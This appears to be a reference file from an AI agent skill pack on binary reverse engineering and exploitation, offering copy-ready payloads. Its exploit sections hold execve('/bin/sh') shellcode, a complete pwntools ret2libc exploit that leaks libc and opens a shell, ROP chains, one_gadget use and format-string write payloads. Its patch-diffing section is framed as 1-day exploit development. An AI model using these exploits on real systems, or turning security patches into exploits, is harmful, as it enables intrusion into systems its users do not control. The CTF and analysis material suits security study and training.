# Binary Reverse Engineering Payloads

> This file is a companion to `SKILL.md`, organizing common commands, scripts, and payloads for binary analysis and exploitation by attack phase.
> Purpose: Quickly find analysis commands and exploit code for specific phases, ready to copy for testing.
> All payloads are for authorized security testing and CTF competitions only.

---

## Index

1. [Binary Identification and Assessment](#1-binary-identification-and-assessment)
2. [radare2 Analysis Commands](#2-radare2-analysis-commands)
3. [GDB Debugging Commands](#3-gdb-debugging-commands)
4. [Buffer Overflow Offset Calculation](#4-buffer-overflow-offset-calculation)
5. [Shellcode Construction](#5-shellcode-construction)
6. [ROP Chain Construction](#6-rop-chain-construction)
7. [ret2libc / ret2plt Exploitation](#7-ret2libc--ret2plt-exploitation)
8. [Format String Exploitation](#8-format-string-exploitation)
9. [radare2 Script Automation](#9-radare2-script-automation)
10. [Firmware Extraction and Analysis](#10-firmware-extraction-and-analysis)

---

## 1. Binary Identification and Assessment

### File Type Identification

```bash
file binary                        # Architecture, format, linking, stripped status
readelf -h binary                  # ELF Header details (entry point, architecture)
readelf -l binary | grep LOAD      # Segment load addresses (determine PIE)
```

### Security Mechanism Detection

```bash
checksec --file=binary             # NX / Canary / PIE / RELRO / Fortify
checksec --file=binary --output=json  # JSON format output

# Manually verify ASLR
cat /proc/sys/kernel/randomize_va_space
# 0=disabled 1=partial(stack/libs) 2=full(stack/libs/heap)

# Manually verify NX
readelf -l binary | grep GNU_STACK
# RWE = executable(no NX), RW = non-executable(NX enabled)
```

### Quick Information Gathering

```bash
strings -n 8 binary | grep -iE "flag|pass|key|secret|/bin/sh"
strings -n 8 binary | sort -u | less
readelf -s binary | grep -i "func\|main"   # Symbol table (unstripped)
readelf -r binary                            # Relocation table (GOT/PLT entries)
objdump -T binary                            # Dynamic symbol table
nm binary 2>/dev/null | sort                 # Symbol addresses (unstripped)
```

---

## 2. radare2 Analysis Commands

### Loading and Analysis

```bash
r2 -A binary                # Load + auto analyze (aaa)
r2 -AA binary               # Load + deep analysis (aaaa)
r2 -d binary                # Load in debug mode
r2 -c "aaa;afl" binary      # Non-interactive mode: analyze then list functions
```

### Information Gathering

```bash
ii                          # Imported functions (libc calls)
iE                          # Exported functions
iS                          # Section table (.text/.data/.bss size and address)
iz                          # Data section strings
izz                         # All strings (including non-ASCII)
iI                          # Binary info (arch/bits/endian/compiler)
```

### Function Analysis

```bash
afl                         # All functions list
afl~sym.                    # Filter symbol functions
pdf @ sym.main              # Disassemble main function
pdf @ sym.vulnerable_func   # Disassemble target function
pdr @ sym.main              # Recursive disassembly (includes sub-calls)
VV                          # Visual control flow graph
VV @ sym.main               # Control flow graph of main
```

### Cross References

```bash
axt sym.imp.strcpy          # Who calls strcpy
axt sym.imp.printf          # Who calls printf
axf @ sym.main              # What functions main calls
```

### Search

```bash
/x 41424344                 # Search byte sequence
/w deadbeef                 # Search dword
/ pop rdi                   # Search instruction sequence
/R pop rdi; ret             # Search gadget sequence
/R ret                      # Search ret gadget
```

### Debug Mode

```bash
r2 -d binary
db main                     # Breakpoint
db 0x080484xx               # Address breakpoint
dc                          # Continue execution
ds                          # Step into
dso                         # Step over
dr                          # Display registers
dr rip                      # Display RIP
px 64 @ rsp                 # Examine stack memory (64 bytes)
px 128 @ rbp-0x40           # Examine local variable area
dm                          # Memory mappings
dmm                         # Module mappings
```

---

## 3. GDB Debugging Commands

### Basic Debugging

```bash
gdb ./binary
gdb -q ./binary             # Quiet mode (no banner)
run                          # Run
run $(python3 -c 'print("A"*100)')   # Run with arguments
run < <(python3 -c 'print("A"*100)') # Input via stdin
quit                         # Exit
```

### Breakpoints

```bash
break main                   # Function breakpoint
break *0x080484xx            # Address breakpoint
delete                       # Delete breakpoints
info breakpoints             # View breakpoints
```

### Execution Control

```bash
continue                     # Continue execution
step                         # Step into (source level)
stepi                        # Step into (instruction level)
next                         # Step over (source level)
nexti                        # Step over (instruction level)
finish                       # Execute until current function returns
```

### Examination

```bash
info registers               # All registers
info registers rip rsp rbp   # Specific registers
x/20x $rsp                   # Examine stack (20 hex words)
x/40i $rip                   # Disassemble current position (40 instructions)
x/s 0x0804xxxx               # View string
p/x $rip                     # Print register value (hexadecimal)
p system                     # Print function address
```

### GEF / pwndbg Enhancements

```bash
# GEF
checksec                    # Security mechanism detection
pattern_create 200           # Generate pattern
pattern_offset 0x41366241    # Calculate offset
vmmap                       # Memory mappings
ropper --file binary --search "pop rdi; ret"   # Gadget search

# pwndbg
cyclic 200                   # Generate pattern
cyclic -l 0x41366241         # Calculate offset
plt                         # PLT table
got                         # GOT table
```

---

## 4. Buffer Overflow Offset Calculation

### Pattern Method (GDB + GEF/pwndbg)

```bash
# Step 1: Generate pattern
gdb ./binary
pattern_create 200           # GEF
# or: cyclic 200              # pwndbg

# Step 2: Run until crash
run $(python3 -c 'import sys; sys.stdout.write("Aa0Aa1Aa2...")')

# Step 3: Calculate offset
pattern_offset <RIP_value>   # GEF
# or: cyclic -l <RIP_value>   # pwndbg
```

### Manual Binary Search

```bash
# Quickly locate offset range
python3 -c 'print("A"*100)' | ./binary     # Crashes
python3 -c 'print("A"*50)' | ./binary      # No crash -> offset > 50
python3 -c 'print("A"*75)' | ./binary      # Crashes -> offset <= 75
python3 -c 'print("A"*60)' | ./binary      # No crash -> offset > 60
```

### Precise Offset Verification

```python
# exploit.py template
offset = 64  # Calculated offset
payload = b"A" * offset
payload += b"B" * 8  # Overwrite RBP (if 64-bit)
payload += p64(0xdeadbeef)  # Overwrite return address
# In GDB, check if RIP is 0xdeadbeef
```

---

## 5. Shellcode Construction

### x86 Linux execve("/bin/sh")

```asm
; 23 bytes x86 shellcode
xor eax, eax
push eax
push 0x68732f2f    ; "//sh"
push 0x6e69622f    ; "/bin"
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0x0b       ; execve syscall
int 0x80
```

```python
# Python wrapper
shellcode_x86 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

### x86_64 Linux execve("/bin/sh")

```asm
; 27 bytes x86_64 shellcode
xor rdi, rdi
push rdi
mov rdi, 0x68732f6e69622f    ; "/bin/sh"
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov al, 59                   ; execve syscall
syscall
```

```python
# Python wrapper
shellcode_x64 = b"\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05"
```

### Shellcode Testing Framework

```c
// shellcode_test.c
#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
                   "\x68\x2f\x62\x69\x6e\x89\xe3\x31"
                   "\xc9\x31\xd2\xb0\x0b\xcd\x80";

int main() {
    printf("Length: %lu\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
    return 0;
}
// gcc -o test shellcode_test.c -z execstack -fno-stack-protector
```

### Bad Character Detection

```python
# Generate all possible bytes (excluding \x00)
badchars = b"\x01\x02\x03...\\xff"  # Full 1-255
# In GDB, check which byte is truncated or modified
# x/256bx $rsp+offset
# Compare byte sequences before and after sending
```

---

## 6. ROP Chain Construction

### Gadget Search

```bash
# ROPgadget
ROPgadget --binary binary --only "pop|ret"
ROPgadget --binary binary --only "pop rdi|ret"
ROPgadget --binary binary --ropchain          # Auto-generate chain
ROPgadget --binary binary --string "/bin/sh"  # Search string

# ropper
ropper --file binary --search "pop rdi; ret"
ropper --file binary --search "pop rsi; pop r15; ret"

# radare2
r2 -A binary
/R pop rdi; ret
/R ret                        # ret gadget (for stack alignment)
```

### ret2plt (Bypass ASLR + NX)

```python
# 64-bit ret2plt: leak libc address via puts@plt
from pwn import *

elf = ELF('./binary')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
pop_rdi = 0x0804xxxx  # pop rdi; ret gadget

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)  # Return to main for second-stage exploitation
```

### Stack Alignment (Common 64-bit Issue)

```python
# 64-bit Ubuntu needs 16-byte alignment before calling system()
# If crash occurs inside system, add a ret gadget
ret_gadget = 0x0804xxxx   # Any ret instruction address

payload = b"A" * offset
payload += p64(ret_gadget)  # Alignment
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

---

## 7. ret2libc / ret2plt Exploitation

### Basic ret2libc (No ASLR)

```python
from pwn import *

# Known libc base (no ASLR or already leaked)
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

### Full ret2libc (Leak + Second-stage Exploitation)

```python
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def exploit():
    # Step 1: Leak puts address
    pop_rdi = address found by ROPgadget
    ret = ret_gadget address

    payload1 = b"A" * offset
    payload1 += p64(pop_rdi) + p64(elf.got['puts'])
    payload1 += p64(elf.plt['puts'])
    payload1 += p64(elf.symbols['main'])

    p = process('./binary')
    p.sendline(payload1)
    p.recvline()

    puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = puts_leak - libc.symbols['puts']
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))

    # Step 2: Call system("/bin/sh")
    payload2 = b"A" * offset
    payload2 += p64(ret)         # Stack alignment
    payload2 += p64(pop_rdi)
    payload2 += p64(binsh)
    payload2 += p64(system)

    p.sendline(payload2)
    p.interactive()

exploit()
```

### one_gadget (Quick Shell)

```bash
# Find one_gadget (trigger shell directly when constraints are satisfied)
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Output example:
# 0x4f2c5 execve("/bin/sh", rsp+0x40, constraints: ...)
# 0x4f322 execve("/bin/sh", rsp+0x40, constraints: ...)
# 0x10a38c execve("/bin/sh", rsp+0x70, constraints: ...)

# Use directly in exploit
one_gadget_addr = libc_base + 0x4f322
payload = b"A" * offset + p64(one_gadget_addr)
```

---

## 8. Format String Exploitation

### Information Leak

```bash
# Basic leak (stack contents)
%p.%p.%p.%p.%p.%p.%p.%p     # Leak values on the stack
%x.%x.%x.%x.%x.%x.%x.%x     # 32-bit leak
%1$p.%2$p.%3$p               # Direct parameter access

# Leak specific offset (determine format string position on stack)
AAAA%1$x.%2$x.%3$x...%10$x  # Find offset of 0x41414141
```

### Arbitrary Address Read

```python
# 32-bit: Read GOT table entry
payload = p32(elf.got['puts'])  # Target address
payload += b"_%7$s"             # Assume format string is at offset 7
# Output: binary puts address + trailing string
```

### Arbitrary Address Write (%n)

```python
# Write value to specified address
target_addr = 0x0804xxxx
value = 0xdeadbeef

# 32-bit precise write (use %hn for 2-byte writes to reduce single write amount)
payload = p32(target_addr)
payload += p32(target_addr + 2)
low = value & 0xffff
high = (value >> 16) & 0xffff

if high > low:
    payload += f"%{low - 8}c%7$hn".encode()
    payload += f"%{high - low}c%8$hn".encode()
else:
    payload += f"%{high - 8}c%8$hn".encode()
    payload += f"%{low - high}c%7$hn".encode()
```

### Format String Canary Leak

```python
# If canary is at a known offset on the stack
# For example, offset 13 contains the canary
payload = b"%13$p"
# Output like: 0x00000000deadbe00 (trailing \x00 is canary characteristic)
# Extract and place at correct position in overflow payload
```

---

## 9. radare2 Script Automation

### r2pipe Batch Vulnerability Scanning

```python
#!/usr/bin/env python3
"""r2pipe automated analysis - batch vulnerability scanning"""
import r2pipe
import json

DANGEROUS_FUNCS = ["strcpy", "sprintf", "gets", "strcat", "printf", "scanf"]

def scan_binary(filepath):
    r2 = r2pipe.open(filepath)
    r2.cmd("aaa")

    results = {
        "file": filepath,
        "arch": r2.cmd("iI~arch").strip(),
        "security": json.loads(r2.cmd("iS~NX") or "{}"),
        "findings": []
    }

    for func in DANGEROUS_FUNCS:
        xrefs = r2.cmd(f"axt sym.imp.{func}").strip()
        if xrefs and "[]" not in xrefs:
            results["findings"].append({
                "type": "dangerous_function",
                "function": func,
                "xrefs": xrefs.split("\n")
            })

    r2.quit()
    return results

if __name__ == "__main__":
    import sys
    result = scan_binary(sys.argv[1])
    print(json.dumps(result, indent=2))
```

### r2pipe Auto ROP Search

```python
#!/usr/bin/env python3
"""Automated ROP gadget search"""
import r2pipe

def find_gadgets(filepath):
    r2 = r2pipe.open(filepath)
    r2.cmd("aaa")

    gadgets = {
        "pop_rdi_ret": r2.cmd("/R pop rdi; ret").strip(),
        "pop_rsi_ret": r2.cmd("/R pop rsi; ret").strip(),
        "pop_rdx_ret": r2.cmd("/R pop rdx; ret").strip(),
        "ret": r2.cmd("/R ret").strip().split("\n")[0] if r2.cmd("/R ret").strip() else None,
    }

    r2.quit()
    return gadgets
```

---

## 10. Firmware Extraction and Analysis

### binwalk Firmware Extraction

```bash
binwalk firmware.bin                          # Scan signatures
binwalk -e firmware.bin                       # Auto extract
binwalk -Me firmware.bin                      # Recursive extraction (extract nested)
binwalk --dd='.*' firmware.bin                # Extract all matching signatures

# Specify extraction directory
binwalk -e -C /tmp/firmware_extracted firmware.bin
```

### Post-Extraction Analysis

```bash
# Identify extracted filesystem type
file /tmp/firmware_extracted/*/squashfs-root/bin/*

# Find sensitive files
find /tmp/firmware_extracted -name "*.conf" -o -name "*.cfg" -o -name "shadow" -o -name "passwd"
grep -r "password\|passwd\|secret\|key" /tmp/firmware_extracted/*/etc/

# Analyze binary components
checksec --file=/tmp/firmware_extracted/*/bin/httpd
strings /tmp/firmware_extracted/*/bin/httpd | grep -i "cmd\|exec\|system"
```

### Embedded Device Specific

```bash
# Find ARM/MIPS architecture binaries
find /tmp/firmware_extracted -type f -exec file {} \; | grep -E "ARM|MIPS"

# Emulate with qemu (ARM)
sudo qemu-arm-static -L /tmp/firmware_extracted/squashfs-root /squashfs-root/bin/httpd

# Emulate with qemu (MIPS)
sudo qemu-mips-static -L /tmp/firmware_extracted/squashfs-root /squashfs-root/bin/httpd
```

---

## 11. Automated Binary Diffing

### BinDiff Analysis

```bash
# Export IDB/BNDb from IDA Pro or Binary Ninja for both binaries
# Then run BinDiff comparison

# Using BinDiff command-line (requires IDA exports)
bindiff --primary original.BinExport --secondary patched.BinExport --output diff_result.BinDiff

# Export BinExport from radare2
r2 -A original_binary -c "aaa; aab; e bin.baddr=0x400000; afla" -q
r2 -A patched_binary -c "aaa; aab; e bin.baddr=0x400000; afla" -q

# Generate function-level diff report
bindiff_export diff_result.BinDiff --format=csv > function_diff.csv

# Filter for modified functions (similarity < 1.0)
awk -F',' '$5 < 1.0 {print $1, $2, $5}' function_diff.csv | sort -t' ' -k3 -n
```

### Diaphora (Open-Source Binary Diffing)

```python
#!/usr/bin/env python3
"""Diaphora-style binary diffing using radare2 for function comparison.
Identifies added, removed, and modified functions between two binary versions."""

import r2pipe
import json
from difflib import SequenceMatcher

def get_functions(binary_path):
    """Extract function signatures and basic blocks from binary."""
    r2 = r2pipe.open(binary_path)
    r2.cmd("aaa")
    functions = {}

    for func in json.loads(r2.cmd("aflj") or "[]"):
        name = func.get("name", "")
        offset = func.get("offset", 0)
        size = func.get("size", 0)
        # Get disassembly for comparison
        disasm = r2.cmd(f"pdf @ {offset}") if size < 10000 else ""
        functions[name] = {
            "offset": offset,
            "size": size,
            "nargs": func.get("nargs", 0),
            "nbbs": func.get("nbbs", 0),  # basic block count
            "disasm": disasm
        }

    r2.quit()
    return functions

def diff_binaries(original_path, patched_path):
    """Compare two binaries and report differences."""
    orig_funcs = get_functions(original_path)
    patch_funcs = get_functions(patched_path)

    results = {"added": [], "removed": [], "modified": []}

    # Find added and modified functions
    for name, patch_data in patch_funcs.items():
        if name not in orig_funcs:
            results["added"].append({"name": name, "size": patch_data["size"]})
        else:
            orig_data = orig_funcs[name]
            if orig_data["size"] != patch_data["size"] or orig_data["nbbs"] != patch_data["nbbs"]:
                similarity = SequenceMatcher(
                    None, orig_data["disasm"], patch_data["disasm"]
                ).ratio()
                results["modified"].append({
                    "name": name,
                    "orig_size": orig_data["size"],
                    "patch_size": patch_data["size"],
                    "similarity": round(similarity, 3)
                })

    # Find removed functions
    for name in orig_funcs:
        if name not in patch_funcs:
            results["removed"].append({"name": name, "size": orig_funcs[name]["size"]})

    return results

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <original> <patched>")
        sys.exit(1)

    results = diff_binaries(sys.argv[1], sys.argv[2])
    print(f"[DIFF] Added: {len(results['added'])} | Removed: {len(results['removed'])} | Modified: {len(results['modified'])}")
    for mod in sorted(results["modified"], key=lambda x: x["similarity"]):
        print(f"  [MOD] {mod['name']} — similarity: {mod['similarity']} (size: {mod['orig_size']} -> {mod['patch_size']})")
```

### Patch Analysis (Security Patch Reverse Engineering)

```bash
# Download and diff two versions of a binary to identify security patches
# Useful for 1-day exploit development

# Step 1: Extract both versions
mkdir -p /tmp/patch_analysis/{original,patched}
cp original_binary /tmp/patch_analysis/original/
cp patched_binary /tmp/patch_analysis/patched/

# Step 2: Generate disassembly for both
r2 -A /tmp/patch_analysis/original/original_binary -c "aaa; pdr @@f > /tmp/patch_analysis/original/disasm.txt" -q
r2 -A /tmp/patch_analysis/patched/patched_binary -c "aaa; pdr @@f > /tmp/patch_analysis/patched/disasm.txt" -q

# Step 3: Diff the disassembly
diff -u /tmp/patch_analysis/original/disasm.txt /tmp/patch_analysis/patched/disasm.txt \
  > /tmp/patch_analysis/patch_diff.txt

# Step 4: Focus on security-relevant changes (bounds checks, validation)
grep -B5 -A10 -E "cmp|jbe|jae|call.*check|call.*valid|call.*sanitize" \
  /tmp/patch_analysis/patch_diff.txt | grep "^[+-]" | head -50

# Step 5: Identify added bounds checks (common security patch pattern)
grep -c "^+" /tmp/patch_analysis/patch_diff.txt
grep -c "^-" /tmp/patch_analysis/patch_diff.txt
echo "Lines added vs removed indicates patch complexity"
```

### Automated Patch Diffing Pipeline

```bash
#!/bin/bash
# Full automated patch analysis pipeline
# Input: two binary versions, Output: security-relevant changes report

ORIGINAL="${1:?Usage: $0 <original_binary> <patched_binary>}"
PATCHED="${2:?Usage: $0 <original_binary> <patched_binary>}"
WORKDIR="/tmp/patch_analysis_$(date +%s)"
REPORT="$WORKDIR/patch_report.md"

mkdir -p "$WORKDIR"
echo "# Patch Analysis Report" > "$REPORT"
echo "Original: $ORIGINAL" >> "$REPORT"
echo "Patched: $PATCHED" >> "$REPORT"
echo "Date: $(date -Iseconds)" >> "$REPORT"
echo "" >> "$REPORT"

# Compare file metadata
echo "## Binary Metadata" >> "$REPORT"
echo "| Property | Original | Patched |" >> "$REPORT"
echo "|----------|----------|---------|" >> "$REPORT"
ORIG_SIZE=$(stat -f%z "$ORIGINAL" 2>/dev/null || stat -c%s "$ORIGINAL")
PATCH_SIZE=$(stat -f%z "$PATCHED" 2>/dev/null || stat -c%s "$PATCHED")
echo "| Size | $ORIG_SIZE | $PATCH_SIZE |" >> "$REPORT"
echo "| SHA256 | $(sha256sum "$ORIGINAL" | cut -d' ' -f1) | $(sha256sum "$PATCHED" | cut -d' ' -f1) |" >> "$REPORT"

# Compare security mechanisms
echo "" >> "$REPORT"
echo "## Security Mechanisms" >> "$REPORT"
checksec --file="$ORIGINAL" --output=json > "$WORKDIR/checksec_orig.json" 2>/dev/null
checksec --file="$PATCHED" --output=json > "$WORKDIR/checksec_patch.json" 2>/dev/null
diff "$WORKDIR/checksec_orig.json" "$WORKDIR/checksec_patch.json" >> "$REPORT" 2>/dev/null

# Function-level comparison
echo "" >> "$REPORT"
echo "## Function Changes" >> "$REPORT"
r2 -A "$ORIGINAL" -c "aaa; aflj" -q > "$WORKDIR/funcs_orig.json" 2>/dev/null
r2 -A "$PATCHED" -c "aaa; aflj" -q > "$WORKDIR/funcs_patch.json" 2>/dev/null

ORIG_COUNT=$(python3 -c "import json; print(len(json.load(open('$WORKDIR/funcs_orig.json'))))" 2>/dev/null || echo "?")
PATCH_COUNT=$(python3 -c "import json; print(len(json.load(open('$WORKDIR/funcs_patch.json'))))" 2>/dev/null || echo "?")
echo "Original functions: $ORIG_COUNT | Patched functions: $PATCH_COUNT" >> "$REPORT"

echo "[PATCH-ANALYSIS] Report: $REPORT"
```

---

## 12. Symbolic Execution

### angr Basic Analysis

```python
#!/usr/bin/env python3
"""angr symbolic execution for automated vulnerability discovery.
Finds inputs that reach specific program states (e.g., 'win' functions, error handlers)."""

import angr
import claripy
import sys

def find_path_to_target(binary_path, target_addr, avoid_addrs=None):
    """Use symbolic execution to find input that reaches target address."""
    proj = angr.Project(binary_path, auto_load_libs=False)

    # Create symbolic input (stdin)
    input_size = 64  # bytes
    sym_input = claripy.BVS("input", input_size * 8)

    # Set up initial state with symbolic stdin
    state = proj.factory.entry_state(
        stdin=angr.SimFile("/dev/stdin", content=sym_input)
    )

    # Configure simulation manager
    simgr = proj.factory.simulation_manager(state)

    # Explore paths to target, avoiding dead ends
    simgr.explore(
        find=target_addr,
        avoid=avoid_addrs or []
    )

    if simgr.found:
        found_state = simgr.found[0]
        # Concretize the symbolic input
        solution = found_state.solver.eval(sym_input, cast_to=bytes)
        print(f"[ANGR] Found path to {hex(target_addr)}")
        print(f"[ANGR] Input: {solution}")
        return solution
    else:
        print(f"[ANGR] No path found to {hex(target_addr)}")
        return None

if __name__ == "__main__":
    binary = sys.argv[1]
    target = int(sys.argv[2], 16) if len(sys.argv) > 2 else None

    if target:
        find_path_to_target(binary, target)
    else:
        # Auto-detect interesting targets (functions with "win", "flag", "success")
        proj = angr.Project(binary, auto_load_libs=False)
        cfg = proj.analyses.CFGFast()
        for func_addr, func in cfg.kb.functions.items():
            if any(kw in func.name.lower() for kw in ["win", "flag", "success", "shell"]):
                print(f"[ANGR] Interesting target: {func.name} @ {hex(func_addr)}")
                find_path_to_target(binary, func_addr)
```

### angr Constraint Solving for CTF

```python
#!/usr/bin/env python3
"""Solve CTF-style crackme challenges using angr constraint solving.
Automatically finds the correct password/key that passes all validation checks."""

import angr
import claripy

def solve_crackme(binary_path, success_string=b"Correct", fail_string=b"Wrong"):
    """Find input that produces success output."""
    proj = angr.Project(binary_path, auto_load_libs=False)

    # Create symbolic argument or stdin
    flag_length = 32
    flag_chars = [claripy.BVS(f"flag_{i}", 8) for i in range(flag_length)]
    flag = claripy.Concat(*flag_chars)

    state = proj.factory.entry_state(
        args=[binary_path, flag],
        add_options=angr.options.unicorn
    )

    # Constrain to printable ASCII
    for char in flag_chars:
        state.solver.add(char >= 0x20)
        state.solver.add(char <= 0x7e)

    simgr = proj.factory.simulation_manager(state)

    # Find state that outputs success string
    simgr.explore(
        find=lambda s: success_string in s.posix.dumps(1),
        avoid=lambda s: fail_string in s.posix.dumps(1)
    )

    if simgr.found:
        solution = simgr.found[0].solver.eval(flag, cast_to=bytes)
        print(f"[SOLVE] Flag: {solution.decode(errors='replace')}")
        return solution
    else:
        print("[SOLVE] No solution found")
        return None

if __name__ == "__main__":
    import sys
    solve_crackme(sys.argv[1])
```

### Manticore Vulnerability Detection

```python
#!/usr/bin/env python3
"""Manticore symbolic execution for buffer overflow detection.
Identifies inputs that cause memory corruption or crash states."""

from manticore.native import Manticore
from manticore.core.smtlib import operators
import sys

def detect_overflow(binary_path):
    """Use Manticore to detect buffer overflow conditions."""
    m = Manticore(binary_path)

    # Hook dangerous functions to detect overflows
    @m.hook(None)  # Will be resolved to actual address
    def check_overflow(state):
        """Monitor for stack smashing or heap corruption."""
        # Check if PC points to invalid memory
        pc = state.cpu.PC
        if not state.mem.is_mapped(pc):
            print(f"[MANTICORE] Crash detected! PC={hex(pc)}")
            # Extract the input that caused the crash
            with m.locked_context() as ctx:
                ctx["crash_inputs"] = ctx.get("crash_inputs", [])
                ctx["crash_inputs"].append({
                    "pc": hex(pc),
                    "input": state.input_symbols
                })
            state.abandon()

    # Configure symbolic stdin
    m.run()

    # Report findings
    print(f"[MANTICORE] Analysis complete")
    print(f"[MANTICORE] States: {m.count_ready_states()} ready, "
          f"{m.count_terminated_states()} terminated, "
          f"{m.count_busy_states()} busy")

    # Generate test cases for each terminated state
    for state_id in m.terminated_state_ids:
        m.generate_testcase(state_id, "crash_input")

if __name__ == "__main__":
    detect_overflow(sys.argv[1])
```

### Symbolic Execution with Constraints (Custom Solver)

```python
#!/usr/bin/env python3
"""Custom constraint solver for complex binary validation routines.
Handles multi-stage checks, hash comparisons, and arithmetic constraints."""

import angr
import claripy

def solve_multi_stage(binary_path, check_addrs):
    """Solve binary with multiple validation stages.
    check_addrs: list of (pass_addr, fail_addr) tuples for each stage."""

    proj = angr.Project(binary_path, auto_load_libs=False)

    # Symbolic input: 64 bytes via stdin
    input_len = 64
    sym_input = claripy.BVS("user_input", input_len * 8)

    state = proj.factory.entry_state(
        stdin=angr.SimFile("/dev/stdin", content=sym_input),
        add_options={
            angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
            angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
        }
    )

    # Add printable constraint
    for i in range(input_len):
        byte = sym_input.get_byte(i)
        state.solver.add(claripy.Or(
            claripy.And(byte >= 0x20, byte <= 0x7e),  # printable
            byte == 0x0a,  # newline
            byte == 0x00   # null terminator
        ))

    simgr = proj.factory.simulation_manager(state)

    # Solve each stage sequentially
    for stage_idx, (pass_addr, fail_addr) in enumerate(check_addrs):
        print(f"[SOLVER] Stage {stage_idx + 1}: find={hex(pass_addr)}, avoid={hex(fail_addr)}")
        simgr.explore(find=pass_addr, avoid=fail_addr)

        if not simgr.found:
            print(f"[SOLVER] Failed at stage {stage_idx + 1}")
            return None

        # Continue from the found state
        simgr = proj.factory.simulation_manager(simgr.found[0])
        print(f"[SOLVER] Stage {stage_idx + 1} passed!")

    # Extract final solution
    final_state = simgr.active[0] if simgr.active else simgr.found[0] if simgr.found else None
    if final_state:
        solution = final_state.solver.eval(sym_input, cast_to=bytes)
        # Trim at null byte
        solution = solution.split(b'\x00')[0]
        print(f"[SOLVER] Solution: {solution}")
        return solution

    return None

if __name__ == "__main__":
    import sys
    binary = sys.argv[1]
    # Example: two-stage check at known addresses
    checks = [
        (0x0040_1234, 0x0040_1300),  # Stage 1: pass/fail
        (0x0040_1400, 0x0040_1500),  # Stage 2: pass/fail
    ]
    solve_multi_stage(binary, checks)
```
